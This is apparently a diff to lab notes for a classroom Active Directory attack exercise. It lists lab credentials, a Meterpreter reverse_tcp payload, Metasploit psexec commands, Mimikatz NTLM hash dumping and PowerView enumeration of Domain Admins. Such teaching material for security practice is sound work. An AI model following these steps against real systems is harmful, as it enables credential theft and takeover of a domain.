@@ -30,13 +30,12 @@ Why is DNS needed for an AD installation?
 
 ### Explore
 
-1. Get into pairs
-2. Use Mimikatz to dump cleartext credentials
-3. Use PSExec in Metasploit to log in with found credentials
+1. SMBDomain = hacker, SMBUser = itadmin, SMBPass = Password123, windows/x64/meterpreter/reverse_tcp
+2. Use PSExec in Metasploit to log into the machine
+3. Use Mimikatz to get NTLM hash for Administrator user
 4. Use PowerView to find Domain Admins
 
 Note:
-* Give them SMBDomain = cucyber, SMBUser = dcrockett, SMBPass = Password123, windows/x64/meterpreter/reverse_tcp, and PowerView
 1. exploit/windows/smb/psexec_psh
 2. set SMBDomain cucyber
 3. set SMBUSER Administrator
